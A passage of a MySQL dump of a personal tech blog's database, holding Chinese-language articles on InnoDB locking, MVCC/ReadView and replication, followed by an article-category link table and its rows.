并不会被堵住,因为表里并没有 a=7 这个记录\nsession A 加的是间隙锁 (5,10)。\nsession B 加的也是间隙锁 (5,10)。\n它们有共同的目标，即：保护这个间隙，不允许插入值。但，它们之间是不冲突的。\n\n// next-key lock\n间隙锁和行锁合称 next-key lock，每个 next-key lock 是前开后闭区间。\n比如表 t 初始化以后，如果用 select * from t for update 要把整个表所有记录锁起来。\n就形成了 7 个 next-key lock，分别是 (-∞,0]、(0,5]、(5,10]、(10,15]、(15,20]、(20, 25]、(25, +supremum]。\nsupremum意思是InnoDB 给每个索引加了一个不存在的最大值 supremum,相当于+∞\n\n// 加锁的规则\n(1) 加锁的基本单位是 next-key lock。\n(2) 查找过程中访问到的对象才会加锁。\n(1) 优化1：索引上的等值查询，给唯一索引加锁的时候，next-key lock 退化为行锁。\n(2) 优化2：索引上的等值查询，向右遍历时且最后一个值不满足等值条件的时候，next-key lock 退化为间隙锁。\n\n```\n#### 间隙锁导致的死锁\n![Mysql间隙锁导致的死锁.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1625472567_Mysql-间隙锁导致的死锁.png)\n```java\n间隙锁和 next-key lock 的引入，帮我们解决了幻读的问题，但同时也带来了一些“困扰”。\n// 例子\nbegin;\nselect * from t where id=N for update;\n\n/*如果行不存在*/\ninsert into t values(N,N,N);\n/*如果行存在*/\nupdate t set d=N set id=N;\n\ncommit;\n\n这个例子的表来说，业务逻辑这样的：\n任意锁住一行，如果这一行不存在的话就插入，\n如果存在这一行就更新它的数据\n\n这个逻辑一旦有并发，就会碰到死锁\n用两个 session 来模拟并发，并假设 N=9\n按语句执行顺序来分析一下\n(1) session A 执行 select … for update 语句，由于 id=9 这一行并不存在，因此会加上间隙锁 (5,10);\n(2) session B 执行 select … for update 语句，同样会加上间隙锁 (5,10)，间隙锁之间不会冲突，因此这个语句可以执行成功；\n(3) session B 试图插入一行 (9,9,9)，被 session A 的间隙锁挡住了，只好进入等待。\n(4) session A 试图插入一行 (9,9,9)，被 session B 的间隙锁挡住了，只好进入等待。\n至此，两个 session 进入互相等待状态，形成死锁。\n当然，InnoDB 的死锁检测马上就发现了这对死锁关系，让 session A 的 insert 语句报错返回了。\n\n// 间隙锁的加锁顺序\n间隙锁的加锁顺序会根据排序的desc或asc关键字,在索引树中按顺序加锁的。\n如果两个语句加锁顺序相反,并且并行执行,可能容易导致死锁\n\n// 尽量避免间隙锁\n间隙锁的引入，可能会导致同样的语句锁住更大的范围，这其实是影响了并发度的。\n为了解决幻读的问题，引入的间隙锁其实影响挺大的\n间隙锁是在可重复读隔离级别下才会生效的。\n可重复读的情况下,普通查询不主动使用行锁的话,是不会产生幻读现象导致查询到新插入数据行的,因为普通查询读的是快照\n可重复读加锁查询是当前读,但是当前读会导致读出新的数据行,也就是幻读情况\n要保证读的数据行数没有变化,没有新插入的数据行,可重复读使用了间隙锁\n\n如果把隔离级别设置为读提交的话，就基本没有间隙锁了。\n读提交的级别在外键场景下才有间隙锁\n在没有可重复读的同时，要解决可能出现的数据和日志不一致问题，需要把 binlog 格式设置为 row。\n读提交 + bing log格式为row是常用的配置组合\n\n```\n### 全局锁\n```java\n// FTWRL全局锁\n顾名思义，全局锁就是对整个数据库实例加锁\nMySQL 提供了一个加全局读锁的方法，命令是 \nFlush tables with read lock\n当需要让整个库处于只读状态的时候，可以使用这个命令，使用后其他线程的以下语句会被阻塞：\n(1) 数据更新语句（数据的增删改）\n(2) 数据定义语句（包括建表、修改表结构等\n(3) 更新类事务的提交语句\n全局锁的典型使用场景是做全库逻辑备份。也就是把整库每个表都 select 出来存成文本。\n如果备份不加锁的话，备份系统备份的得到的库不是一个逻辑时间点，这个视图是逻辑不一致的\n通过 FTWRL 确保不会有其他线程对数据库做更新，然后对整个库做备份。注意，在备份过程中整个库完全处于只读状态\n让整库都只读,会造成很大的影响\n(1)如果在主库上备份，那么在备份期间都不能执行更新，业务基本上就得停摆\n(2)如果在从库上备份，那么备份期间从库不能执行主库同步过来的 binlog，会导致主从延迟\n\n// 使用事务隔离实现\n官方自带的逻辑备份工具是 mysqldump。\n当 mysqldump 使用参数–single-transaction 的时候，导数据之前就会启动一个可重复读事务，来确保拿到一致性视图。\n由于 MVCC 的支持，这个过程中数据是可以正常更新的\nsingle-transaction 方法只适用于所有的表使用事务引擎的库。\n如果有的表使用了不支持事务的引擎，比如MyISAM,那么备份就只能通过 FTWRL 方法。\n\n```\n### 表锁\n```java\nMySQL 里面表级别的锁有两种：一种是表锁，一种是元数据锁（meta data lock，MDL)。\n// 表锁\n表锁的语法是 lock tables … read/write，与 FTWRL 类似。\n可以用 unlock tables 主动释放锁，也可以在客户端断开的时候自动释放\nlock tables 语法除了会限制别的线程的读写外，也限定了本线程接下来的操作对象\n如果在某个线程 A 中执行 lock tables t1 read, t2 write\n其他线程写 t1、读写 t2 的语句都会被阻塞。\n同时线程 A 在执行 unlock tables 释放表锁之前，它也只能执行读 t1、读写 t2 的操作。不允许写t1\n在没有出现更细粒度的锁之前，表锁是最常用的处理并发的方式。\n对于 InnoDB 这种支持行锁的引擎，一般不使用 lock tables 命令来控制并发，锁住整个表的影响太大了\n\n// MDL（metadata lock)元数据锁\nMySQL 5.5 版本中引入了 MDL\nMDL 不需要显式使用，在访问一个表的时候会被自动加上。\nMDL 的作用是保证读写的正确性。\n否则如果一个查询正在遍历一个表中的数据，而执行期间另一个线程对这个表结构做变更，删了一列，那么查询线程拿到的结果跟表结构对不上，这肯定是不行的\n当对一个表做增删改查操作的时候，加 MDL 读锁；\n当要对表做结构变更操作的时候，加 MDL 写锁\n(1) 读锁之间不互斥，因此可以有多个线程同时对一张表增删改查\n(2) 读写锁之间、写锁之间是互斥的，用来保证变更表结构操作的安全性。因此，如果有两个线程要同时给一个表加字段，其中一个要等另一个执行完才能开始执行\n\n// 注意事项\n// 谨慎的给表加字段\n给一个表加字段，或者修改字段，或者加索引，需要扫描全表的数据,因为MDL锁的原因,可能会导致整个库挂了\n当加字段,改字段,加索引的时候会需要MDL写锁,\n在写锁释放之前,所有后续对表的增删改查操作都需要先申请 MDL 读锁，但MDL读写锁是互斥的,所以就全都被锁住，等于这个表现在完全不可读写了\n如果某个表上的查询语句频繁，而且客户端有重试机制,这个库的线程很快就会爆满\n如果要给表加字段,一定在 alter table 语句里面设定等待时间，如果在这个指定的等待时间里面能够拿到 MDL 写锁完成最好，拿不到就先放弃,以免影响业务语句,等夜深人静的时候在来做\n// 查找长事务\n在 MySQL 的 information_schema 库的 innodb_trx 表中，可以查到当前执行中的事务。\n如果你要做 DDL 变更的表刚好有长事务在执行，考虑先暂停 DDL或者 kill 掉这个长事务\n\n```', 0, 0, 189, 0, 0, '2021-04-23 20:19:36', '2021-04-17 20:19:36', 0, 0);
INSERT INTO `article` VALUES (114, 1, 'mysql的多版本并发控制MVCC', '2019/9/1568551559_mmexport1568451185122.jpg', '### 事务隔离级别\n![Mysql事务隔离级别.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1625239674_Mysql-事务隔离级别.png)\n```java\n// 事务隔离级别\n1. Serializable(串行化): 会加写锁与读锁。当出现读写锁冲突的时候，后访问的事务必须等前一个事务执行完成，才能继续执行。\n2. RepeatableRead(可重复读): 一个事务执行过程中看到的数据，总是跟这个事务在启动时看到的数据是一致的。\n3. ReadCommitted(读已提交): 一个事务提交之后，它做的变更才会被其他事务看到。\n4. ReadUncommitted(读未提交): 一个事务还没提交时，它做的变更就能被别的事务看到\n\n// 不同隔离级别的结果\n不同的隔离级别下，事务A的返回结果会不同，v1、v2、v3 的返回值是什么\n读未提交: v1=2、v2=2、v3=2。事务B虽然还没提交,但结果已经被A看到了,因此，v1是2,v2、v3也都是2\n读提交: v1=1、v2=2、v3=2,事务B的更新在提交后才能被A看到。所以V2的值是2,v3也是2。\n可重复读: v1=1,v2=1,v3=2,事务在执行期间看到的数据前后必须是一致的,所以v2=1\n串行化: v1=1,v2=1,v3=2事务B执行将1改成2的时候,会被锁住,直到事务 A 提交后，事务B才可以继续执行。所以事务A的v1、v2值是1,v3的值是 2\n\n// 视图概念\n在 mysql 里，有两个“视图”的概念\n(1) 一个是 view。它是一个用查询语句定义的虚拟表，在调用的时候执行查询语句并生成结果。创建视图的语法是 create view … ，而它的查询方法与表一样。\n(2) 另一个是 InnoDB 在实现 MVCC 时用到的一致性读视图，即 consistent read view，用于支持 RC（Read Committed，读提交）和 RR（Repeatable Read，可重复读）隔离级别的实现\n\n数据库会创建一个视图,不同事务访问的时候都是以视图的逻辑结果为准\n在 读提交 隔离级别下,这个视图是在每个sql语句开始执行时创建的\n在 可重复读 隔离级别下,这个视图是在事务启动时创建的,整个事务存在期间都用这一个视图\n在 读未提交 隔离级别下,直接返回记录上的最新值,没有视图的概念\n在 串行化 隔离级别下,直接使用加锁的方式避免并行访问,没有视图的概念\n\n在不同的隔离级别下，数据库行为是有所不同的\nOracle 数据库的默认隔离级别是 读提交\nMysql 数据库的默认隔离级别是 可重复读\n如果需要数据迁移，一定要将隔离级别设置正确\n\n```\n### ReadViewde的实现\n#### undolog的版本链\n![Mysqlundolog版本链.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1625834578_Mysql-undolog版本链.png)\n```java\n// trx_id\nInnoDB 里面每个事务有一个唯一的事务 ID，叫作 transaction id。\n它是在事务开始的时候向 InnoDB 的事务系统申请的，是按申请顺序严格递增的\n每行数据是有多个版本的。每次事务更新数据的时候，都会生成一个新的数据版本，并且把 transaction id 赋值给这个数据版本的事务 ID，记为 row trx_id。\n同时，旧的数据版本要保留，并且在新的数据版本中，能够有办法可以拿到旧数据版本。\n也就是说，数据表中的一行记录，其实可能有多个版本 (row)，每个版本有自己的 row trx_id\n\n// 隐藏字段 trx_id roll_pointer\n每条数据其实都有两个隐藏字段，一个是trx_id，一个是roll_pointer。\ntrx_id: 最近一次更新这条数据的事务id\nroll_pointer: 指向更新这个事务之前生成的undo log\n假设有一个事务A（id=50），插入了一条数据。\n因为事务A的id是50，所以这条数据的txr_id就是50，roll_pointer指向一个空的undo log，因为之前这条数据是没有的。\n接着假设有一个事务B过来修改一下这条数据，把值改成了值B，事务B的id是58。\n那么此时更新之前会生成一个undo log记录之前的值，然后会让roll_pointer指向这个实际的undo log回滚日志。\n接着假设事务C又来修改了一下这个值为值C，他的事务id是69，此时会把数据行里的txr_id改成69，然后生成一条undo log，记录之前事务B修改的那个值\n多个事务串行执行的时候，每个事务修改了一行数据，都会更新隐藏字段txr_id和roll_pointer。\n\n// undo log记录的是数据的前后变化\n图中虚线框里是同一行数据的3个版本，当前最新版本是v3,值是值C,\n它是被 trx_id=69 的事务更新的，因此这行数据版本的 row trx_id 是69\nundo log记录的就是图中两个虚线u1、u2前后变化的值和执行变化的事务id\n因为记录了u1、u2执行前后变化值和事务id,所以值A、值B、值C 并不是物理上真实存在的。\n不是物理真实存在,而是每次需要的时候根据当前版本和 undo log 计算出来的,所以不需要拷贝数据\n比如当需要 v1 的时候，就是通过 v3 依次执行 u2、u1 算出来的\n\nundo log通过roll_pinter指针串联起来，形成一个重要的数据版本链\n```\n#### ReadView-基本概念\n![MysqlReadView概念.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1625835759_Mysql-ReadView-概念.png)\n```java\n// undo log多版本链条实现的ReadView机制\n启动一个事务时，会生成一个ReadView，里面比较关键的东西有4个\n(1) m_ids: 此时有哪些事务在MySQL里执行但还没提交的,执行中但没提交的事务称为活跃事务；\n(2) min_trx_id: m_ids里最小的值；\n(3) max_trx_id: mysql下一个要生成的事务id，就是最大事务id；\n(4) creator_trx_id: 当前这个事务的id\n// 视图数组m_ids\nInnoDB 为每个事务构造了一个数组,这个数组保存这个事务启动瞬间，当前正在\"活跃\"的所有事务 ID。\n这个m_ids数组称为视图数组，\"活跃\"指的就是，启动了但还没提交的那些事务的id\n// 高低水位 min_trx_id和max_trx_id\n低水位min_trx_id: 视图数组中的事务ID的最小值记为低水位\n高水位max_trx_id: 当前已经创建过的事务ID的最大值加1记为高水位,也就是mysql下一个要生成的事务id\n本事务ID creator_trx_id: 当前执行的这个事务自己的id\n这四个东西就组成了当前事务的一致性视图（read-view）\n数据版本的可见性规则，就是基于undo log的数据版本链的 row trx_id 加上这个一致性视图的对比结果得到的\n\n// 对比结果规则\n一个数据版本的 row trx_id，对于当前事务的视图数组来说有以下几种可能\n(1) 如果这个row trx_id比min_trx_id小,表示这个版本是已提交的事务或者是当前事务自己生成的，这个数据是可见的\n(2) 如果这个row trx_id比max_trx_id大,表示这个版本是由以后启动的事务生成的，是肯定不可见的\n(3) 如果这个row trx_id与creator_trx_id相等,说明是本事务自己的更新,可见\n(4) 不符合(1)(2)(3)情况下,如果这个row trx_id在m_ids中,表示这个版本是由还没提交的事务生成的，不可见\n(5) 不符合(1)(2)(3)情况下,如果这个row trx_id不在m_ids中,表示这个版本是已经提交了的事务生成的，可见\n\n// 查找undo log数据版本链\n当根据对比结果规则为不可见的情况下,那么会去找到这个数据版本的\"上一个版本\"\n意思就是顺着这条数据的roll_pointer顺着undo log日志链条往下找\n如果\"上一个版本\"也不符合比对结果规则,那就继续往前找,直到找到的数据版本是是符合比对结果规则的。\n\n// RC实现ReadView机制\n当一个事务设置处于RC隔离级别的时候，它是每次发起查询，都重新生成一个ReadView\n如果在这次查询之前，有事务修改了数据还提交了,那么这次查询生成的ReadView里，m_ids列表不包含这个已经提交的事务了，既然不包含已经提交的事务了，那么当然可以读到提交过的修改过的值了。\n\n// RR实现ReadView机制\n当一个事务设置处于RR隔离级别的时候，它是第一次查询时生成一个ReadView,整个事务期间只使用这一个ReadView\n别的事务修改数据之后哪怕提交了，也是看不到修改的值的，这就避免了不可重复读的问题。\n别的事务插入了一些新的数据，也是读不到的，这样就可以避免幻读的问题。\n\n所谓的ReadView机制，其实是基于undo log版本链条加一致性视图实现的一套读视图机制。\n生成一个ReadView，之后如果是本事务自己更新的数据，自己是可以读到的，或者是在你生成ReadView之前提交的事务修改的值，也是可以读取到的。\n但如果是生成ReadView的时候，就已经处于活跃的其他事务在本事务生成ReadView之后修改了数据，接着提交了，此时本事务是读不到的，或者是你生成ReadView以后再开启的事务修改了数据，还提交了，此时也是读不到的。\n读ReadView的数据称之为\"一致性读\"。\n\n// 一些注意事项\n// 不要使用长事务\n长事务意味着会存在很老的事务视图数组。\n由于这些事务随时可能访问数据库里面的任何数据，所以这个事务提交之前，数据库里面它可能用到的回滚记录都必须保留，这就会导致大量占用存储空间\n可以在 information_schema 库的 innodb_trx 这个表中查询长事务\n这个语句用于查找持续时间超过 60s 的事务\nselect * from information_schema.innodb_trx where TIME_TO_SEC(timediff(now(),trx_started))>60\n// set autocommit不要设置为0\n如果set autocommit=0，那么会将这个线程的自动提交关掉。\n这样的话,每个SQL语句或者语句块所在的事务都需要显式的主动执行\"commit\"才能提交事务\n设置为0,执行一个 select 语句,那这个事务就启动了,持续存在直到你主动执行 commit 或 rollback 语句或者断开连接才会结束\n// 可重复读和读提交\n(1)在可重复读隔离级别下，只需要在事务开始启动的时候创建一致性视图，之后事务里的其他查询都共用这个一致性视图\n(2)在读提交隔离级别下，每一个语句执行前都会重新算出一个新的视图\n// 事务启动的时机\nbegin/start transaction 命令并不是一个事务的起点，在执行到它们之后的第一个操作 InnoDB 表的语句，事务才真正启动。\n事务的两种启动时机\n(1) 一致性视图是在执行第一个快照读语句时创建的\n(2) 一致性视图是在执行 start transaction with consistent snapshot 时创建的\n如果你想要马上启动一个事务，可以使用 start transaction with consistent snapshot 这个命令\n```\n#### ReadView-例子\n![MysqlReadView读取原始值.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1625835179_Mysql-ReadView读取原始值.png)\n```java\n假设数据库里原来就有一行数据，很早以前就有事务插入过了，事务id是32，它的值就是初始值\n接着现在有两个事务并发过来执行了，一个是事务A（id=45），一个是事务B（id=59）\n事务B是要去更新这行数据的，事务A是要去读取这行数据的值的\n现在事务A会直接开启一个ReadView，这个ReadView里的m_ids就包含了事务A和事务B的两个id，也就是45和59，然后min_trx_id就是45，max_trx_id就是60，creator_trx_id就是45是事务A自己。\n这时事务A第一次查询这行数据，会走一个判断，判断一下当前这行数据的txr_id是否小于我的ReadView中的min_trx_id。\n此时发现txr_id=32，是小于ReadView里的min_trx_id就是45的，说明你事务开启之前，修改这行数据的事务早就提交了，所以此时可以查到这行数据。\n```\n![MysqlReadView读取undolog链.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1625835179_Mysql-ReadView读取undolog链.png)\n```java\n接着事务B开始动手把这行数据的值修改为了值B，然后这行数据的txr_id设置为自己的id，也就是59,同时roll_pointer指向了修改之前生成的一个undo log，接着这个事务B就提交了。\n这时事务A再次查询，此时查询的时候，会发现一个问题，那就是此时数据行里的txr_id=59，这个txr_id是大于我的ReadView里的min_txr_id(45)，同时小于ReadView里的max_trx_id（60）的。\n说明更新这条数据的事务，很可能就跟自己差不多同时开启的，于是会看一下这个txr_id=59，是否在ReadView的m_ids列表里\n在事务A的ReadView的m_ids列表里，有45和59两个事务id，说明这个修改数据的事务B是跟自己同一时段并发执行然后提交的，所以对这行数据是不能查询的。\n既然这行数据不能查询，那就顺着这条数据的roll_pointer顺着undo log日志链条往下找。\n会找到最近的一条undo log，trx_id是32，此时发现trx_id=32，是小于ReadView里的min_trx_id（45）的，说明这个undo log版本必然是在事务A开启之前就执行且提交的,就用这个值\n```\n![MysqlReadView读取自己的更新值.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1625835179_Mysql-ReadView读取自己的更新值.png)\n```java\n接着假设事务A自己更新了这行数据的值，改成值A，trx_id修改为45，同时保存之前事务B修改的值的快照。\n此时事务A来查询这条数据的值，会发现这个trx_id=45，和自己的ReadView里的creator_trx_id（45）是一样的，说明这行数据是自己修改的,用这个值\n```\n![MysqlReadViewundolog找到自己的更新值.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1625835179_Mysql-ReadView-undolog找到自己的更新值.png)\n```java\n接着在事务A执行的过程中，突然开启了一个事务C，这个事务C的id是78，然后他更新了那行数据的值为值C，还提交了。\n这个时候事务A再去查询，会发现当前数据的trx_id=78，大于了自己的ReadView中的max_trx_id（60），说明事务A开启之后，之后有一个事务更新了数据,对于事务A来说当然是不能看到的了\n此时就会顺着undo log多版本链条往下找，自然先找到值A自己之前修改的过的那个版本，因为那个trx_id=45跟自己的ReadView里的creator_trx_id是一样的，所以此时直接读取自己之前修改的那个版本。\n```\n#### 当前读\n![Mysql当前读.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1625836426_Mysql-当前读.png)\n```java\n// update更新数据是当前读\n事务更新数据的时候,不能从ReadView历史版本链上按照视图规则进行一致性读,而是每次读的都是最新的值。否则的话事务B的更新就丢失了。\n当前读也就是数据版本链上的最新值\n\n// select加锁也是当前读\n除了 update 语句外，select 语句如果加锁，也是当前读\n如果把事务 A 的查询语句 select * from t where id=1 修改一下\n加上 lock in share mode 或 for update，也都是当前读,返回是值B,而不是原始值\n比如下面这两个 select 语句，就是分别加了读锁（S 锁，共享锁）和写锁（X 锁，排他锁）\nmysql> select k from t where id=1 lock in share mode;\nmysql> select k from t where id=1 for update;\n\n// 因为是当前读所以要等待锁\n事务是当前读，必须要读最新版本，所以会导致必须加锁，因此就被锁住了，必须等到其他释放这个锁，才能继续它的当前读\n```', 0, 0, 184, 0, 0, '2021-04-28 20:46:08', '2021-05-07 20:46:08', 0, 0);
INSERT INTO `article` VALUES (115, 1, 'mysql的主备数据同步基本原理与同步延迟', '2019/10/1571039997_mmexport1570974200426.jpg', '### 主备同步\n![Mysql主备同步.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1625806470_Mysql-主备同步.png)\n```java\n客户端的读写都是直接访问节点 A。\n节点 B 是 A 的备库，只是将 A 的更新都同步过来，到本地执行。\n这样可以保持节点 B 和 A 的数据是相同的。\n\n备库 B 跟主库 A 之间维持了一个长连接。\n主库 A 内部有一个线程，专门用于服务备库 B 的这个长连接。一个事务日志同步的完整过程是这样的：\n(1) 在备库 B 上通过 change master 命令，设置主库 A 的 IP、端口、用户名、密码，以及要从哪个位置开始请求 binlog，这个位置包含文件名和日志偏移量。\n(2) 在备库 B 上执行 start slave 命令，这时候备库会启动两个线程， io_thread 和 sql_thread。其中 io_thread 负责与主库建立连接。\n(3) 主库 A 校验完用户名、密码后，开始按照备库 B 传过来的位置，从本地读取 binlog，发给 B。\n(4) 备库 B 拿到 binlog 后，写到本地文件，称为中转日志（relay log）。\n(5) sql_thread 读取中转日志，解析出日志里的命令，并执行。\n\n// 数据同步的binlog格式不能为statement\n有些 statement 格式的 binlog 可能会导致主备不一致，所以不能使用 row 格式。\nbinlog 有三种格式，statement、row、mixed,mixed其实是前两种格式的混合。\nMySQL 自己会判断mixed格式的这条 SQL 语句是否可能引起主备不一致。\n如果有可能，就用 row 格式，否则就用 statement 格式。\n推荐把binlog 格式设置成 row。\n\n```\n### 主备延迟\n![Mysql半同步复制.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1625430452_Mysql-半同步复制.png)\n```java\n// 半同步复制semi-sync\n半同步复制是用来解决主库数据丢失问题的\n主库写入bin log之后，就会将强制此时立即将数据同步到备库\n备库将bin log写入自己本地的relay log之后，接着会返回一个ack给主库\n主库接收到至少一个从库的ack之后才会认为写操作完成了。\n注意这时候备库的数据存储中实际上数据没有被更新,需要等待sql_thread将relay log的数据写入数据才会被更新\n所以这会造成数据同步延迟的问题\n\n// 数据同步延迟\n(1) 主库 A 执行完成一个事务，写入 binlog，我们把这个时刻记为 T1;\n(2) 同步数据传给备库 B，我们把备库 B 接收完这个 binlog 的时刻记为 T2;\n(3) 备库 B 执行完成这个事务，我们把这个时刻记为 T3。\n所谓主备延迟，就是同一个事务，在备库执行完成的时间和主库执行完成的时间之间的差值，也就是 T3-T1。\n\n在备库上执行 show slave status 命令，返回结果里面会显示 seconds_behind_master，用于表示当前备库延迟了多少秒\nseconds_behind_master 的计算方法是这样的：\n(1) 每个事务的 binlog 里面都有一个时间字段，用于记录主库上写入的时间；\n(2) 备库取出当前正在执行的事务的时间字段的值，计算它与当前系统时间的差值，得到 seconds_behind_master。\n其实 seconds_behind_master 这个参数计算的就是 T3-T1。所以，我们可以用 seconds_behind_master 来作为主备延迟的值，这个值的时间精度是秒。\n备库连接到主库的时候，会通过执行 SELECT UNIX_TIMESTAMP() 函数来获得当前主库的系统时间。\n如果这时候发现主库的系统时间与自己不一致，备库在执行 seconds_behind_master 计算的时候会自动扣掉这个差值。\n网络正常的时候，日志从主库传给备库所需的时间是很短的，即 T2-T1 的值是非常小的。\n网络正常情况下，主备延迟的主要来源是备库接收完 binlog 和执行完这个事务之间的时间差。\n主备延迟最直接的表现是，备库消费中转日志（relay log）的速度，比主库生产 binlog 的速度要慢。\n产生的原因有比如\n(1) 备库所在机器配置比主库机器配置差,所以主备库应该选用相同规格的机器，并且做对称部署。\n(2) 备库的压力大,备库一般会做读写分离提供一些读能力,如果备库上的查询耗费了大量的 CPU 资源，影响了同步速度，会造成主备延迟。\n(3) 大事务,大表的DDL操作,主库上必须等事务执行完成才会写入 binlog，再传给备库。所以，如果一个主库上的语句执行 10 分钟，那这个事务很可能就会导致从库延迟 10 分钟。\n(4) 并行复制,备库上 sql_thread 更新数据 (DATA) 的逻辑。如果是用单线程的话，就会导致备库应用日志不够快，造成主备延迟。\n```\n### 并行复制\n![Mysql并行复制.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1625431053_Mysql-并行复制.png)\n```java\n主备的并行复制能力,关注的是备库 sql_thread 执行中转日志（relay log）\n备库上 sql_thread 更新数据 (DATA) 的逻辑。如果是用单线程的话，就会导致备库应用日志不够快，造成主备延迟。\nMySQL 5.6 版本之前，MySQL 只支持单线程复制，由此在主库并发高、TPS 高时就会出现严重的主备延迟问题。\n\n// 多线程复制\n从单线程复制到最新版本的多线程复制,就是将只有一个线程的 sql_thread，拆成多个线程\n(1) coordinator 就是原来的 sql_thread, 不过现在它不再直接更新数据了，只负责读取中转日志和分发事务。\n(2) 真正更新日志的，变成了 worker 线程。work 线程的个数，由参数 slave_parallel_workers 决定的。\n\nMySQL 5.6 版本，支持了并行复制，只是支持的粒度是按库并行。\nMySQL 5.7.22 出现的并行复制策略 WRITESET和WRITESET_SESSION\n// WRITESET\n(1) 对于事务涉及更新的每一行，计算出这一行的 hash 值，组成集合 writeset。\n(2) 如果两个事务没有操作相同的行，也就是说它们的 writeset 没有交集，就可以并行。\n// WRITESET_SESSION比WRITESET多一个约束\n(3) 主库上同一个线程先后执行的两个事务，在备库执行的时候，要保证相同的先后顺序。\n\n这个 hash 值是通过“库名 + 表名 + 索引名 + 值”计算出来的。\n如果表上除了有主键索引外，还有其他唯一索引，那么每多一个唯一索引，insert 语句对应的 writeset 就要多增加一个 hash 值。\n如果“表上没主键”和“外键约束”的场景，WRITESET和WRITESET_SESSION 策略是没法并行的，也会暂时退化为单线程模型\n\nwriteset 是在主库生成后直接写入到 binlog 里面的，这样在备库执行的时候，不需要解析 binlog 内容（event 里的行数据），节省了很多计算量；\n不需要把整个事务的 binlog 都扫一遍才能决定分发到哪个 worker，更省内存；\n由于备库的分发策略不依赖于 binlog 内容，所以 binlog 是 statement 格式也是可以的。\n```\n### 读写分离\n![Mysql读写分离.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1625430452_Mysql-读写分离.png)\n```java\n读写分离主要目的就是分摊主库的压力。\n读写分离一般由两种方式\n(1) 客户端（client）主动做负载均衡，这种模式下一般会把数据库的连接信息放在客户端的连接层。也就是说，由客户端来选择后端数据库进行查询,比如shardingSphere。\n(2) 在 MySQL 和客户端之间有一个中间代理层 proxy，客户端只连接 proxy， 由 proxy 根据请求类型和上下文决定请求的分发路由。比如mycat\n\n客户端直连方案，因为少了一层 proxy 转发，所以查询性能稍微好一点儿，并且整体架构简单，排查问题更方便。\n但这种方案，由于要了解后端部署细节，所以在出现主备切换、库迁移等操作的时候，客户端都会感知到，并且需要调整数据库连接信息。\n这样客户端也太麻烦，信息大量冗余，需要一个负责管理后端的组件，比如 Zookeeper，尽量让业务端只专注于业务逻辑开发\n\nproxy 中间件的方案，对客户端比较友好。\n客户端不需要关注后端细节，连接维护、后端信息维护等工作，都是由 proxy 完成的。\n但这样的话，对后端维护团队的要求会更高。而且，proxy 也需要有高可用架构。因此，带 proxy 架构的整体就相对比较复杂。\n\n// 主从延迟解决\n不论使用哪种架构，都会由于主从可能存在延迟，客户端执行完一个更新事务后马上发起查询，如果查询选择的是从库的话，就有可能读到刚刚的事务更新之前的状态。\n如何处理这种过期读的现象,靠谱的有以下方案\n(1) 强制走主库方案\n(2) GTID 方案,实现复杂\n\n// 强制走主库方案\n强制走主库方案其实就是将查询请求做分类。通常情况下，我们可以将查询请求分为这么两类：\n(1) 对于必须要拿到最新结果的请求，强制将其发到主库上。\n比如，在一个交易平台上，卖家发布商品以后，马上要返回主页面，看商品是否发布成功。那么，这个请求需要拿到最新的结果，就必须走主库。\n(2) 对于可以读到旧数据的请求，才将其发到从库上。在这个交易平台上，买家来逛商铺页面，就算晚几秒看到最新发布的商品，也是可以接受的。那么，这类请求就可以走从库。\n一些金融类的业务会要求数据是实时的,这种所有查询都不能是过期读的业务,就要放弃读写分离，所有读写压力都在主库，等同于放弃了扩展性。\n\n```', 0, 0, 115, 0, 0, '2021-04-29 16:00:10', '2021-05-01 16:00:10', 0, 0);

-- ----------------------------
-- Table structure for article_bind_article_category
-- ----------------------------
DROP TABLE IF EXISTS `article_bind_article_category`;
CREATE TABLE `article_bind_article_category`  (
  `id` int(0) UNSIGNED NOT NULL AUTO_INCREMENT COMMENT '文章分类关系主键id',
  `article_id` int(0) NOT NULL COMMENT '文章id',
  `article_category_id` int(0) NOT NULL COMMENT '分类id',
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 7439 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '处理分类与文章关系的数据表,文章需要通过该表获得分类信息' ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of article_bind_article_category
-- ----------------------------
INSERT INTO `article_bind_article_category` VALUES (1, 1, 4);
INSERT INTO `article_bind_article_category` VALUES (2, 2, 4);
INSERT INTO `article_bind_article_category` VALUES (3, 3, 4);
INSERT INTO `article_bind_article_category` VALUES (4, 4, 1);
INSERT INTO `article_bind_article_category` VALUES (5, 5, 1);
INSERT INTO `article_bind_article_category` VALUES (6, 6, 1);
INSERT INTO `article_bind_article_category` VALUES (7, 7, 1);
INSERT INTO `article_bind_article_category` VALUES (8, 8, 1);
INSERT INTO `article_bind_article_category` VALUES (9, 9, 1);
INSERT INTO `article_bind_article_category` VALUES (10, 10, 1);
INSERT INTO `article_bind_article_category` VALUES (11, 11, 3);
INSERT INTO `article_bind_article_category` VALUES (12, 12, 3);
INSERT INTO `article_bind_article_category` VALUES (13, 13, 3);
INSERT INTO `article_bind_article_category` VALUES (14, 14, 3);
INSERT INTO `article_bind_article_category` VALUES (15, 15, 3);
INSERT INTO `article_bind_article_category` VALUES (16, 16, 1);
INSERT INTO `article_bind_article_category` VALUES (17, 17, 1);
INSERT INTO `article_bind_article_category` VALUES (18, 18, 1);
INSERT INTO `article_bind_article_category` VALUES (19, 19, 1);
INSERT INTO `article_bind_article_category` VALUES (20, 20, 1);
INSERT INTO `article_bind_article_category` VALUES (21, 21, 1);
INSERT INTO `article_bind_article_category` VALUES (22, 22, 1);
INSERT INTO `article_bind_article_category` VALUES (23, 23, 1);
INSERT INTO `article_bind_article_category` VALUES (24, 24, 1);
INSERT INTO `article_bind_article_category` VALUES (25, 25, 1);
INSERT INTO `article_bind_article_category` VALUES (26, 26, 1);
INSERT INTO `article_bind_article_category` VALUES (27, 27, 1);
